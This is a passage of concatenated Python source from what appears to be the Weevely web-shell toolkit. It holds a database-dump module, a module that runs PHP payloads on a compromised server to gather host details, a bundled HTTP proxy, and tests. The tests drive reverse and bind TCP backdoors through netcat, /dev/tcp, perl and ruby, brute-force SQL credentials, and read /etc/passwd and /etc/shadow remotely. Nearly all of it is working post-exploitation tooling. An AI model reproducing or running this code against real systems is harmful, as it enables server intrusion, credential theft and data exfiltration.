        self.argparser.add_argument('-user', help='SQL username')
        self.argparser.add_argument('-pass', help='SQL password')
        self.argparser.add_argument('db', help='Database to dump')
        self.argparser.add_argument('-table', help='Table to dump')
        self.argparser.add_argument('-host', help='DBMS host or host:port', default='127.0.0.1')
        #argparser.add_argument('-dbms', help='DBMS', choices = ['mysql', 'postgres'], default='mysql')
        self.argparser.add_argument('-vector', choices = self.vectors.keys())
        self.argparser.add_argument('-ldump', help='Local path to save dump (default: temporary folder)')
        
    def _prepare_vector(self):
        if not self.args['table']:
            self.args['table'] = ''
        self.formatted_args = self.args.copy()
        
    def _verify_vector_execution(self):
        if self._result and '-- Dumping data for table' in self._result:
            raise ProbeSucceed(self.name,'Dumped')
            
    def _stringify_result(self):

        if self._result: 
            if not '-- Dumping data for table' in self._result:
                self.mprint(WARN_DUMP_INCOMPLETE)
            
            if not self.args['ldump']:
                temporary_folder = mkdtemp(prefix='weev_')
                self.args['ldump'] = path.join(temporary_folder, '%s:%s@%s-%s.txt' % (self.args['user'], self.args['pass'], self.args['host'], self.args['db']))
                
            try:
                lfile = open(self.args['ldump'],'w').write(self._result)
            except:
                raise ProbeException(self.name,  "\'%s\' %s" % (self.args['ldump'], WARN_DUMP_ERR_SAVING))
            else:
                self.mprint("\'%s\' %s" % (self.args['ldump'], WARN_DUMP_SAVED))
        else:
            raise ProbeException(self.name,  WARN_NO_DUMP)
########NEW FILE########
__FILENAME__ = info
'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module
from core.moduleexception import ModuleException
from core.argparse import ArgumentParser
from core.vector import VectorsDict
import urllib2

from re import compile

re_lsb_release = compile('Description:[ \t]+(.+)')
re_etc_lsb_release = compile('(?:DISTRIB_DESCRIPTION|PRETTY_NAME)="(.+)"')
re_exitaddress = compile('\nExitAddress[\s]+([^\s]+)')


WARN_NO_EXITLIST = 'Error downloading TOR exit list'

class Info(Module):
    """Collect system information"""

    def _set_vectors(self):
            self.support_vectors.add_vector('document_root', 'shell.php', "@print($_SERVER['DOCUMENT_ROOT']);"),
            self.support_vectors.add_vector('whoami', 'shell.php', "$u=@posix_getpwuid(posix_geteuid()); if($u) { $u = $u['name']; } else { $u=getenv('username'); } print($u);"),
            self.support_vectors.add_vector('hostname', 'shell.php', "@print(gethostname());"),
            self.support_vectors.add_vector('cwd', 'shell.php', "@print(getcwd());"),
            self.support_vectors.add_vector('open_basedir', 'shell.php', "$v=@ini_get('open_basedir'); if($v) print($v);"),
            self.support_vectors.add_vector('safe_mode', 'shell.php', "(ini_get('safe_mode') && print(1)) || print(0);"),
            self.support_vectors.add_vector('script', 'shell.php', "@print($_SERVER['SCRIPT_NAME']);"),
            self.support_vectors.add_vector('uname', 'shell.php', "@print(php_uname());"),
            self.support_vectors.add_vector('os', 'shell.php', "@print(PHP_OS);"),
            self.support_vectors.add_vector('client_ip', 'shell.php', "@print($_SERVER['REMOTE_ADDR']);"),
            self.support_vectors.add_vector('max_execution_time', 'shell.php', '@print(ini_get("max_execution_time"));'),
            self.support_vectors.add_vector('php_self', 'shell.php', '@print($_SERVER["PHP_SELF"]);')
            self.support_vectors.add_vector('dir_sep' , 'shell.php',  '@print(DIRECTORY_SEPARATOR);')
            self.support_vectors.add_vector('php_version' , 'shell.php',  "$v=''; if(function_exists( 'phpversion' )) { $v=phpversion(); } elseif(defined('PHP_VERSION')) { $v=PHP_VERSION; } elseif(defined('PHP_VERSION_ID')) { $v=PHP_VERSION_ID; } print($v);")
    
            self.release_support_vectors = VectorsDict(self.modhandler)
            self.release_support_vectors.add_vector('lsb_release' , 'shell.sh',  'lsb_release -d')
            self.release_support_vectors.add_vector('read' , 'file.read',  '$rpath')
    
    def _set_args(self):
        additional_args = ['all', 'release', 'check_tor']
        self.argparser.add_argument('info', help='Information',  choices = self.support_vectors.keys() + additional_args, default='all', nargs='?')

    def __check_tor(self):
        
        exitlist_urls = ('http://exitlist.torproject.org/exit-addresses', 'http://exitlist.torproject.org/exit-addresses.new')
        
        exitlist_content = ''
        for url in exitlist_urls:
            try:
                exitlist_content += urllib2.urlopen(url, timeout=1).read() + '\n'
            except Exception, e:
                self.mprint('%s: \'%s\'' % ( WARN_NO_EXITLIST, url))
            
        addresses = re_exitaddress.findall(exitlist_content)
        client_ip = self.support_vectors.get('client_ip').execute()
        
        return client_ip in addresses
            


    def __guess_release(self):
        
        lsb_release_output = self.release_support_vectors.get('lsb_release').execute()
        if lsb_release_output: 
            rel = re_lsb_release.findall(lsb_release_output)
            if rel: return rel[0]
            
        for rpath in ('/etc/lsb-release', '/etc/os-release',):
            etc_lsb_release_content =  self.release_support_vectors.get('read').execute({'rpath' : rpath})
            if etc_lsb_release_content:
                rel = re_etc_lsb_release.findall(etc_lsb_release_content)
                if rel: return rel[0]

        for rpath in ('/etc/issue.net', '/etc/issue',):
            etc_issue_content =  self.release_support_vectors.get('read').execute({'rpath' : rpath}).strip()
            if etc_issue_content:
                return etc_issue_content

        return ''

    def _probe(self):
        
        if self.args['info'] == 'check_tor':
            self._result = self.__check_tor()
        elif self.args['info'] == 'release':
            self._result = self.__guess_release().strip()
        elif self.args['info'] != 'all':
            self._result = self.support_vectors.get(self.args['info']).execute()
        else:
            
            self._result = {}

            for vect in self.support_vectors.values():
                self._result[vect.name] = vect.execute()
                
            self._result['release'] = self.__guess_release()
            self._result['check_tor'] = self.__check_tor()
                
                    
        

########NEW FILE########
__FILENAME__ = baseclasses
#!/usr/bin/env python
import sys, os, socket, unittest, shlex, random, atexit
sys.path.append(os.path.abspath('..'))
import core.terminal
from core.modulehandler import ModHandler
from core.sessions import cfgfilepath
from ConfigParser import ConfigParser
from string import ascii_lowercase, Template
from tempfile import NamedTemporaryFile
from PythonProxy import start_server, start_dummy_tcp_server  
from thread import start_new_thread    
from shutil import move, rmtree
from time import sleep
from test import conf
from core.utils import randstr
from commands import getstatusoutput


class SimpleTestCase(unittest.TestCase):
    
    @classmethod  
    def setUpClass(cls):  
        
        cls.term = core.terminal.Terminal (ModHandler(conf['url'], conf['pwd']))
        cls._setenv()        

    @classmethod  
    def tearDownClass(cls):  
        cls._rm_sess()
        cls._unsetenv()

    @classmethod 
    def _rm_sess(cls):
        
        atexit._exithandlers[:] = []
          
        if not cfgfilepath.startswith('/') and os.path.exists(cfgfilepath):
            rmtree(cfgfilepath)
        
    @classmethod  
    def _setenv(cls):  
        cls.basedir = os.path.join(conf['env_base_writable_web_dir'], randstr(4))
        cls._env_mkdir(cls.basedir)
        
    @classmethod     
    def _unsetenv(cls):  
        cls._env_rm()        

    @classmethod
    def _run_test(cls, command):
        if not conf['showtest']:
            stdout = sys.stdout
            sys.stdout = open(os.devnull, 'w')  
        else:
            print command
            
        cls.term.run_cmd_line(shlex.split(command))
        
        if not conf['showtest']: 
            sys.stdout = stdout
        

    def _outp(self, command):
        self.__class__._run_test(command)
        return self.term._last_output
 
    def _warn(self, command):
        self.__class__._run_test(command)
        return self.term.modhandler._last_warns

    def _res(self, command):
        self.__class__._run_test(command)
        return self.term._last_result

    @classmethod  
    def _run_cmd(cls, cmd, weevely = True):
        if weevely:
            command = '%s %s %s %s' % (conf['cmd'], conf['url'], conf['pwd'], cmd)
        else:
            command = cmd
            
        status, output = getstatusoutput(command)
        
        if conf['showcmd']:
            print '\n%s> %s' % (command, output)
         
    @classmethod  
    def _env_mkdir(cls, relpath):
        abspath = os.path.join(cls.basedir, relpath)
        cmd = Template(conf['env_mkdir_command']).safe_substitute(path=abspath)
        cls._run_cmd(cmd)
        
    @classmethod  
    def _env_newfile(cls, relpath, content = '1'):
    
        file = NamedTemporaryFile()
        file.close()
        frompath = file.name
        
        f = open(frompath, 'w')
        f.write(content)
        f.close()
        
        abspath = os.path.join(cls.basedir, relpath)
        cmd = Template(conf['env_cp_command']).safe_substitute(frompath=frompath, topath=abspath)
        cls._run_cmd(cmd)


    @classmethod  
    def _env_chmod(cls, relpath, mode='0744'):
        
        
        
        abspath = os.path.join(cls.basedir, relpath)
        
        cmd = Template(conf['env_chmod_command']).safe_substitute(path=abspath, mode=mode)

        cls._run_cmd(cmd)

    @classmethod  
    def _env_rm(cls, relpath = ''):
        abspath = os.path.join(cls.basedir, relpath)
        
        # Restore modes
        cls._env_chmod(cls.basedir)
        
        if cls.basedir.count('/') < 3:
            print 'Please check %s, not removing' % cls.basedir
            return
        
        cmd = Template(conf['env_rm_command']).safe_substitute(path=abspath)

        cls._run_cmd(cmd)


    @classmethod  
    def _env_cp(cls, absfrompath, reltopath):
        
        abstopath = os.path.join(cls.basedir, reltopath)
        cmd = Template(conf['env_cp_command']).safe_substitute(frompath=absfrompath, topath=abstopath)
            
        cls._run_cmd(cmd)


class FolderFSTestCase(SimpleTestCase):

    @classmethod
    def _setenv(cls):
        
        SimpleTestCase._setenv.im_func(cls)
        
        cls.dirs =  []
        newdirs = ['w1', 'w2', 'w3', 'w4']
        
        for i in range(1,len(newdirs)+1):
            folder = os.path.join(*newdirs[:i])
            cls._env_mkdir(os.path.join(folder))
            cls.dirs.append(folder)
        
        

    @classmethod
    def _unsetenv(cls):
        SimpleTestCase._unsetenv.im_func(cls)


    def _path(self, command):
        self.__class__._run_test(command)
        return self.term.modhandler.load('shell.php').stored_args_namespace['path']


class FolderFileFSTestCase(FolderFSTestCase):
    
    @classmethod
    def _setenv(cls):    
        FolderFSTestCase._setenv.im_func(cls)
        
        cls.filenames = []
        i=1
        for dir in cls.dirs:
            filename = os.path.join(dir, 'file-%d.txt' % i )
            cls._env_newfile(filename)
            cls.filenames.append(filename)
            i+=1

        # Restore modes
        cls._env_chmod(cls.basedir, recursive=True)

    @classmethod  
    def _env_chmod(cls, relpath, mode='0744', recursive = False):
        
        
        if recursive:
            items = sorted(cls.filenames + cls.dirs)
        else:
            items = [ relpath ]
        
        for item in items:
            abspath = os.path.join(cls.basedir, item)
            cmd = Template(conf['env_chmod_command']).safe_substitute(path=abspath, mode=mode)
            cls._run_cmd(cmd)

class RcTestCase(SimpleTestCase):
    
    @classmethod
    def _setenv(cls):
        
        SimpleTestCase._setenv.im_func(cls)
        cls.rcfile = NamedTemporaryFile()
        cls.rcpath = cls.rcfile.name
        

    @classmethod
    def _write_rc(cls, rc_content):
        # Create rc to load
        cls.rcfile.write(rc_content)
        cls.rcfile.flush()

    @classmethod
    def _unsetenv(cls):
        SimpleTestCase._unsetenv.im_func(cls)    
        cls.rcfile.close()

    
class ProxyTestCase(RcTestCase):
    
    @classmethod
    def _setenv(cls):
        RcTestCase._setenv.im_func(cls)

        cls.proxyport = random.randint(50000,65000)
        start_new_thread(start_server, ('localhost', cls.proxyport))
        cls.dummyserverport = cls.proxyport+1
        start_new_thread(start_dummy_tcp_server, ('localhost', cls.dummyserverport))


    @classmethod
    def _unsetenv(cls):
        RcTestCase._unsetenv.im_func(cls)    

    
            

########NEW FILE########
__FILENAME__ = PythonProxy
# -*- coding: cp1252 -*-
# <PythonProxy.py>
#
#Copyright (c) <2009> <Fábio Domingues - fnds3000 in gmail.com>
#
#Permission is hereby granted, free of charge, to any person
#obtaining a copy of this software and associated documentation
#files (the "Software"), to deal in the Software without
#restriction, including without limitation the rights to use,
#copy, modify, merge, publish, distribute, sublicense, and/or sell
#copies of the Software, and to permit persons to whom the
#Software is furnished to do so, subject to the following
#conditions:
#
#The above copyright notice and this permission notice shall be
#included in all copies or substantial portions of the Software.
#
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
#EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
#OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
#NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
#HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
#WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
#FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
#OTHER DEALINGS IN THE SOFTWARE.

"""\
Copyright (c) <2009> <Fábio Domingues - fnds3000 in gmail.com> <MIT Licence>

                  **************************************
                 *** Python Proxy - A Fast HTTP proxy ***
                  **************************************

Neste momento este proxy é um Elie Proxy.

Suporta os métodos HTTP:
 - OPTIONS;
 - GET;
 - HEAD;
 - POST;
 - PUT;
 - DELETE;
 - TRACE;
 - CONENCT.

Suporta:
 - Conexões dos cliente em IPv4 ou IPv6;
 - Conexões ao alvo em IPv4 e IPv6;
 - Conexões todo o tipo de transmissão de dados TCP (CONNECT tunneling),
     p.e. ligações SSL, como é o caso do HTTPS.

A fazer:
 - Verificar se o input vindo do cliente está correcto;
   - Enviar os devidos HTTP erros se não, ou simplesmente quebrar a ligação;
 - Criar um gestor de erros;
 - Criar ficheiro log de erros;
 - Colocar excepções nos sítios onde é previsível a ocorrência de erros,
     p.e.sockets e ficheiros;
 - Rever tudo e melhorar a estrutura do programar e colocar nomes adequados nas
     variáveis e métodos;
 - Comentar o programa decentemente;
 - Doc Strings.

Funcionalidades futuras:
 - Adiconar a funcionalidade de proxy anónimo e transparente;
 - Suportar FTP?.


(!) Atenção o que se segue só tem efeito em conexões não CONNECT, para estas o
 proxy é sempre Elite.

Qual a diferença entre um proxy Elite, Anónimo e Transparente?
 - Um proxy elite é totalmente anónimo, o servidor que o recebe não consegue ter
     conhecimento da existência do proxy e não recebe o endereço IP do cliente;
 - Quando é usado um proxy anónimo o servidor sabe que o cliente está a usar um
     proxy mas não sabe o endereço IP do cliente;
     É enviado o cabeçalho HTTP "Proxy-agent".
 - Um proxy transparente fornece ao servidor o IP do cliente e um informação que
     se está a usar um proxy.
     São enviados os cabeçalhos HTTP "Proxy-agent" e "HTTP_X_FORWARDED_FOR".

"""

import socket, thread, select

__version__ = '0.1.0 Draft 1'
BUFLEN = 8192
VERSION = 'Python Proxy/'+__version__
HTTPVER = 'HTTP/1.1'

class ConnectionHandler:
    def __init__(self, connection, address, timeout):
        self.client = connection
        self.client_buffer = ''
        self.timeout = timeout
        self.method, self.path, self.protocol = self.get_base_header()
        if self.method=='CONNECT':
            self.method_CONNECT()
        elif self.method in ('OPTIONS', 'GET', 'HEAD', 'POST', 'PUT',
                             'DELETE', 'TRACE'):
            self.method_others()
        self.client.close()
        self.target.close()

    def get_base_header(self):
        while 1:
            self.client_buffer += self.client.recv(BUFLEN)
            end = self.client_buffer.find('\n')
            if end!=-1:
                break
        #print '%s'%self.client_buffer[:end]#debug
        data = (self.client_buffer[:end+1]).split()
        self.client_buffer = self.client_buffer[end+1:]
        return data

    def method_CONNECT(self):
        self._connect_target(self.path)
        self.client.send(HTTPVER+' 200 Connection established\n'+
                         'Proxy-agent: %s\n\n'%VERSION)
        self.client_buffer = ''
        self._read_write()        

    def method_others(self):
        self.path = self.path[7:]
        i = self.path.find('/')
        host = self.path[:i]        
        path = self.path[i:]
        self._connect_target(host)
        self.target.send('%s %s %s\n'%(self.method, path, self.protocol)+
                         self.client_buffer)
        self.client_buffer = ''
        self._read_write()

    def _connect_target(self, host):
        i = host.find(':')
        if i!=-1:
            port = int(host[i+1:])
            host = host[:i]
        else:
            port = 80
        (soc_family, _, _, _, address) = socket.getaddrinfo(host, port)[0]
        self.target = socket.socket(soc_family)
        self.target.connect(address)

    def _read_write(self):
        time_out_max = self.timeout/3
        socs = [self.client, self.target]
        count = 0
        while 1:
            count += 1
            (recv, _, error) = select.select(socs, [], socs, 3)
            if error:
                break
            if recv:
                for in_ in recv:
                    data = in_.recv(BUFLEN)
                    if in_ is self.client:
                        out = self.target
                    else:
                        out = self.client
                    if data:
                        out.send(data)
                        count = 0
            if count == time_out_max:
                break

proxy_counts = 0
def start_server(host='localhost', port=8008, IPv6=False, timeout=60,
                  handler=ConnectionHandler):
    
    global proxy_counts
    
    if IPv6==True:
        soc_type=socket.AF_INET6
    else:
        soc_type=socket.AF_INET
    soc = socket.socket(soc_type)
    soc.bind((host, port))
    print "Serving on %s:%d."%(host, port)#debug
    soc.listen(0)
    while 1:
        thread.start_new_thread(handler, soc.accept()+(timeout,))
        proxy_counts += 1


dummy_counts = 0
def start_dummy_tcp_server(host='localhost', port=8009):

    global dummy_counts
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))

    s.listen(1)

    while 1:
        conn, addr = s.accept()
        data = conn.recv(BUFLEN)
        conn.send(data)
        
        conn.close()
        dummy_counts += 1


if __name__ == '__main__':
    start_server()

########NEW FILE########
__FILENAME__ = test
#!/usr/bin/env python
import unittest
from ConfigParser import ConfigParser
from argparse import ArgumentParser
from glob import glob
import os, sys, shutil
sys.path.append(os.path.abspath('..'))
from core.sessions import cfgfilepath

def run_all(confpatterns):
    
    files = []
    for pattern in confpatterns:
        files.extend(glob(pattern))
        
    module_strings = [str[0:len(str)-3] for str in files]
    suites = [unittest.defaultTestLoader.loadTestsFromName(str) for str in module_strings]
    testSuite = unittest.TestSuite(suites)
    text_runner = unittest.TextTestRunner(verbosity=2).run(testSuite)
    
confpath = ''
confpattern = []

argparser = ArgumentParser()
argparser.add_argument('ini_file')
argparser.add_argument('test_patterns', nargs='*', default =  [ 'test_*.py' ])
argparser.add_argument('-showcmd', action='store_true')
argparser.add_argument('-showtest', action='store_true')

parsed = argparser.parse_args()

configparser = ConfigParser()
configparser.read(parsed.ini_file)
conf = configparser._sections['global']
conf['showcmd'] = parsed.showcmd
conf['showtest'] = parsed.showtest
conf['shell_sh'] = True if conf['shell_sh'].lower() == 'true' else False


if __name__ == "__main__":
    run_all(parsed.test_patterns)
    shutil.rmtree(cfgfilepath)

########NEW FILE########
__FILENAME__ = test_backdoor
#from baseclasses import ExecTestCase
import pexpect
from random import randint
from unittest import TestCase, skipIf
from test import conf
import sys, os
sys.path.append(os.path.abspath('..'))
from modules.backdoor.reversetcp import WARN_BINDING_SOCKET

@skipIf(not conf['shell_sh'], "Skipping shell.sh dependent tests")
class Backdoors(TestCase):
    def setUp(self):
        
        self.ports = range(int(conf['backdoor_tcp_startport']), int(conf['backdoor_tcp_endport']))
                      
        call = ''
        command = '%s %s %s %s' % (conf['cmd'], conf['url'], conf['pwd'], call)
        self.process = pexpect.spawn(command, timeout=5)
        
        idx = self.process.expect(['.+@.+:.+ (?:(PHP) >)|(?: \$) ', pexpect.TIMEOUT, pexpect.EOF])
        self.assertEqual(idx, 0, 'Error spawning weevely: %s%s' % (self.process.before, self.process.after))
        
    def tearDown(self):
        self.process.close()
        
    def _check_oob_shell(self, cmd, testcmd, testresult):
        
        self.process.send(cmd)

        idx = self.process.expect(['\n','\$', '.+@.+:.+ (?:(PHP) >)|(?: \$) ', pexpect.TIMEOUT, pexpect.EOF])
        self.assertNotEqual(idx, 2, 'Error connecting to port: %s%s' % (self.process.before, self.process.after))
        self.process.send(testcmd)
        
        idx = self.process.expect([str(testresult), pexpect.TIMEOUT, pexpect.EOF])
        self.assertEqual(idx, 0, 'Error executing commands: %s%s' % (self.process.before, self.process.after))
        self.process.send('exit;\r\n')    
        
        idx = self.process.expect(['.+@.+:.+ (?:(PHP) >)|(?: \$) ', pexpect.TIMEOUT, pexpect.EOF])
        self.assertEqual(idx, 0, 'Error returning to Weevely shell: %s%s' % (self.process.before, self.process.after))
        
    def _check_oob_shell_errors(self, cmd, expectedmsg):
        
        self.process.send(cmd)
        
        idx = self.process.expect([expectedmsg, '\$', '.+@.+:.+ (?:(PHP) >)|(?: \$) ', pexpect.TIMEOUT, pexpect.EOF])
        self.assertEqual(idx, 0, 'Error expecting error message: %s%s' % (self.process.before, self.process.after))
        
    @skipIf(not conf['backdoor_tcp_startport'] or not conf['backdoor_tcp_endport'], "Skipping backdoor direct connect")
    def test_tcp(self):
        testvalue = randint(1,100)*2
        self._check_oob_shell(':backdoor.tcp %i\r\n' % self.ports.pop(0), 'echo $((%i+%i));\r\n' % (testvalue/2, testvalue/2), testvalue )

    @skipIf(not conf['backdoor_reverse_tcp_startport'] or not conf['backdoor_reverse_tcp_endport'] or not conf['backdoor_reverse_tcp_host'], "Skipping backdoor reverse connect")        
    def test_reverse_tcp(self):
        testvalue = randint(1,100)*2
        self._check_oob_shell(':backdoor.reversetcp %s\r\n' % conf['backdoor_reverse_tcp_host'], 'echo $((%i+%i));\r\n' % (testvalue/2, testvalue/2), testvalue )
        
        testvectors = [ [v,  randint(20000,25000)] for v in ('netcat-traditional', 'netcat-bsd', 'python', 'devtcp', 'perl', 'ruby', 'telnet') ]
        for vector in testvectors:
            self._check_oob_shell(':backdoor.reversetcp %s -vector %s -port %i\r\n' % (conf['backdoor_reverse_tcp_host'], vector[0], vector[1]), 'echo $((%i+%i));\r\n' % (testvalue/2, testvalue/2), testvalue )
        
        
    @skipIf(not conf['backdoor_reverse_tcp_startport'] or not conf['backdoor_reverse_tcp_endport'] or not conf['backdoor_reverse_tcp_host'], "Skipping backdoor reverse connect")        
    def test_reverse_tcp_error(self):
        self._check_oob_shell_errors(':backdoor.reversetcp %s -port 80\r\n' % conf['backdoor_reverse_tcp_host'],   WARN_BINDING_SOCKET)
        
########NEW FILE########
__FILENAME__ = test_brutesql
from baseclasses import SimpleTestCase
from tempfile import NamedTemporaryFile
import random, string
import sys, os
sys.path.append(os.path.abspath('..'))
import modules
from test import conf

class BruteSQL(SimpleTestCase):
    
    def _generate_wordlist(self, insert_word = ''):
        wordlist = [''.join(random.choice(string.ascii_lowercase) for x in range(random.randint(1,50))) for x in range(random.randint(1,50)) ]
        if insert_word:
            wordlist[random.randint(0,len(wordlist)-1)] = insert_word
        return wordlist
        
    
    def test_brutesql(self):

        for dbms in ['mysql', 'postgres']:

            if conf['test_only_dbms'] and conf['test_only_dbms'] != dbms:
                continue
    
            if dbms == 'mysql':
                user = conf['mysql_sql_user']
                pwd = conf['mysql_sql_pwd']
            else:
                user = conf['pg_sql_user']
                pwd = conf['pg_sql_pwd']
                                
            expected_match = [ user, pwd ]
            
            self.assertEqual(self._res(':bruteforce.sql %s -wordlist "%s" -dbms %s' % (user, str(self._generate_wordlist(pwd)), dbms)), expected_match)
            
            temp_path = NamedTemporaryFile(); 
            temp_path.write('\n'.join(self._generate_wordlist(pwd)))
            temp_path.flush() 
            
            self.assertEqual(self._res(':bruteforce.sql %s -wordfile "%s" -dbms %s' % (user, temp_path.name, dbms)), expected_match)
            self.assertRegexpMatches(self._warn(':bruteforce.sql %s -wordfile "%sunexistant" -dbms %s' % (user, temp_path.name, dbms)), modules.bruteforce.sql.WARN_NO_SUCH_FILE)
            self.assertRegexpMatches(self._warn(':bruteforce.sql %s' % (user)), modules.bruteforce.sql.WARN_NO_WORDLIST)
            
            self.assertEqual(self._res(':bruteforce.sql %s -chunksize 1 -wordlist "%s" -dbms %s' % (user, str(self._generate_wordlist(pwd)), dbms)), expected_match)
            self.assertEqual(self._res(':bruteforce.sql %s -chunksize 100000 -wordlist "%s" -dbms %s' % (user, str(self._generate_wordlist(pwd)), dbms)), expected_match)
            self.assertEqual(self._res(':bruteforce.sql %s -chunksize 0 -wordlist "%s" -dbms %s' % (user, str(self._generate_wordlist(pwd)),dbms)), expected_match)
            
            wordlist = self._generate_wordlist() + [ pwd ]
            self.assertEqual(self._res(':bruteforce.sql %s -wordlist "%s" -dbms %s -startline %i' % (user, str(wordlist), dbms, len(wordlist)-1)), expected_match)
            self.assertRegexpMatches(self._warn(':bruteforce.sql %s -wordlist "%s" -dbms %s -startline %i' % (user, str(wordlist), dbms, len(wordlist)+1)), modules.bruteforce.sql.WARN_STARTLINE)
            
            
            temp_path.close()

    def test_brutesqlusers(self):

        for dbms in ['mysql', 'postgres']:

            if conf['test_only_dbms'] and conf['test_only_dbms'] != dbms:
                continue
    
            if dbms == 'mysql':
                user = conf['mysql_sql_user']
                pwd = conf['mysql_sql_pwd']
            else:
                user = conf['pg_sql_user']
                pwd = conf['pg_sql_pwd']
    
            expected_match = { user : pwd }
            self.assertEqual(self._res(':bruteforce.sqlusers -wordlist "%s" -dbms %s' % ( str(self._generate_wordlist(pwd)), dbms)), expected_match)
            
            temp_path = NamedTemporaryFile(); 
            temp_path.write('\n'.join(self._generate_wordlist(pwd)))
            temp_path.flush() 
            
            self.assertEqual(self._res(':bruteforce.sqlusers -wordfile "%s" -dbms %s' % ( temp_path.name, dbms)), expected_match)
            self.assertRegexpMatches(self._warn(':bruteforce.sqlusers -wordfile "%sunexistant" -dbms %s' % ( temp_path.name, dbms)), modules.bruteforce.sql.WARN_NO_SUCH_FILE)
            self.assertRegexpMatches(self._warn(':bruteforce.sqlusers '), modules.bruteforce.sql.WARN_NO_WORDLIST)
            
            self.assertEqual(self._res(':bruteforce.sqlusers -chunksize 1 -wordlist "%s" -dbms %s' % ( str(self._generate_wordlist(pwd)), dbms)), expected_match)
            self.assertEqual(self._res(':bruteforce.sqlusers -chunksize 100000 -wordlist "%s" -dbms %s' % ( str(self._generate_wordlist(pwd)), dbms)), expected_match)
            self.assertEqual(self._res(':bruteforce.sqlusers -chunksize 0 -wordlist "%s" -dbms %s' % ( str(self._generate_wordlist(pwd)),dbms)), expected_match)
            
            wordlist = self._generate_wordlist() + [ pwd ]
            self.assertEqual(self._res(':bruteforce.sqlusers -wordlist "%s" -dbms %s -startline %i' % ( str(wordlist), dbms, len(wordlist)-1)), expected_match)
            self.assertRegexpMatches(self._warn(':bruteforce.sqlusers  -wordlist "%s" -dbms %s -startline %i' % ( str(wordlist), dbms, len(wordlist)+1)), modules.bruteforce.sql.WARN_STARTLINE)
            
            
            temp_path.close()
            
            
########NEW FILE########
__FILENAME__ = test_check
from baseclasses import FolderFileFSTestCase
from test import conf
import os, sys
sys.path.append(os.path.abspath('..'))
import modules
import modules.file.check

class FSCheck(FolderFileFSTestCase):

    def test_check(self):
        
        self.assertEqual(self._outp(':file.check unexistant exists'), 'False')
        self.assertEqual(self._outp(':file.check %s read' % self.basedir), 'True')
        self.assertEqual(self._outp(':file.check %s exec' % self.basedir), 'True')
        self.assertEqual(self._outp(':file.check %s isfile' % self.basedir), 'False')
        self.assertEqual(self._outp(':file.check %s exists' % self.basedir), 'True')
        self.assertEqual(self._outp(':file.check %s isfile' % os.path.join(self.basedir,self.filenames[0])), 'True')
        self.assertEqual(self._outp(':file.check %s md5' % os.path.join(self.basedir,self.filenames[0])), 'c4ca4238a0b923820dcc509a6f75849b')
        self.assertEqual(self._res(':file.check %s size' % os.path.join(self.basedir,self.filenames[0])), 1)
        self.assertRegexpMatches(self._warn(':file.check unexistant size'), modules.file.check.WARN_INVALID_VALUE)

            
########NEW FILE########
__FILENAME__ = test_download
from baseclasses import FolderFileFSTestCase
from tempfile import NamedTemporaryFile
import sys, os
sys.path.append(os.path.abspath('..'))
import modules
from unittest import skipIf
from test import conf


class FSDownload(FolderFileFSTestCase):

    def setUp(self):
        self.temp_path = NamedTemporaryFile(); self.temp_path.close(); 
        self.remote_path = os.path.join(self.basedir, self.filenames[0])
        self.remote_path_empty = os.path.join(self.basedir, self.filenames[0] + '_empty')
        
        self.__class__._env_newfile(self.remote_path_empty, content='')

    def test_download(self):
        
        self.assertRegexpMatches(self._warn(':file.download /etc/gne /tmp/asd') , modules.file.download.WARN_NO_SUCH_FILE)
        self.assertRegexpMatches(self._warn(':file.download /etc/passwd /tmpsaddsaas/asd') , 'Errno')
        self.assertRegexpMatches(self._warn(':file.download /etc/shadow /tmp/asd') , modules.file.download.WARN_NO_SUCH_FILE)

        # False and True printout
        self.assertEqual(self._outp(':file.download /etc/issue %s'  % (self.temp_path.name)), 'True')
        self.assertEqual(self._outp(':file.download /etc/issue2 %s'  % (self.temp_path.name)).rstrip().split('\n')[-1], 'False')

        self.assertEqual(self._res(':file.download %s %s -vector file'  % (self.remote_path, self.temp_path.name)), 'c4ca4238a0b923820dcc509a6f75849b')
        self.assertEqual(self._res(':file.download %s %s -vector fread'  % (self.remote_path, self.temp_path.name)), 'c4ca4238a0b923820dcc509a6f75849b')
        self.assertEqual(self._res(':file.download %s %s -vector file_get_contents'  % (self.remote_path, self.temp_path.name)), 'c4ca4238a0b923820dcc509a6f75849b')
        self.assertEqual(self._res(':file.download %s %s -vector copy'  % (self.remote_path, self.temp_path.name)), 'c4ca4238a0b923820dcc509a6f75849b')
        self.assertEqual(self._res(':file.download %s %s -vector symlink'  % (self.remote_path, self.temp_path.name)), 'c4ca4238a0b923820dcc509a6f75849b')

        #Test download empty file
        self.assertEqual(self._outp(':file.download %s %s'  % (self.remote_path_empty, self.temp_path.name)), 'True')
        self.assertEqual(self._res(':file.download %s %s'  % (self.remote_path_empty, self.temp_path.name)), 'd41d8cd98f00b204e9800998ecf8427e')
        


    @skipIf(not conf['shell_sh'], "Skipping shell.sh dependent tests")
    def test_download_sh(self):
        self.assertEqual(self._res(':file.download %s %s -vector base64'  % (self.remote_path, self.temp_path.name)), 'c4ca4238a0b923820dcc509a6f75849b')
        
    def test_read(self):
        
        self.assertRegexpMatches(self._warn(':file.read /etc/gne') , modules.file.download.WARN_NO_SUCH_FILE)
        self.assertRegexpMatches(self._warn(':file.read /etc/shadow') , modules.file.download.WARN_NO_SUCH_FILE)

        self.assertEqual(self._outp(':file.read %s -vector file'  % (self.remote_path)), '1')
        self.assertEqual(self._outp(':file.read %s -vector fread'  % (self.remote_path)), '1')
        self.assertEqual(self._outp(':file.read %s -vector file_get_contents'  % (self.remote_path)), '1')
        self.assertEqual(self._outp(':file.read %s -vector copy'  % (self.remote_path)), '1')
        self.assertEqual(self._outp(':file.read %s -vector symlink'  % (self.remote_path)), '1')
        
    @skipIf(not conf['shell_sh'], "Skipping shell.sh dependent tests")
    def test_read_sh(self):
        self.assertEqual(self._outp(':file.read %s -vector base64'  % (self.remote_path)), '1')
        
########NEW FILE########
__FILENAME__ = test_edit
from baseclasses import SimpleTestCase
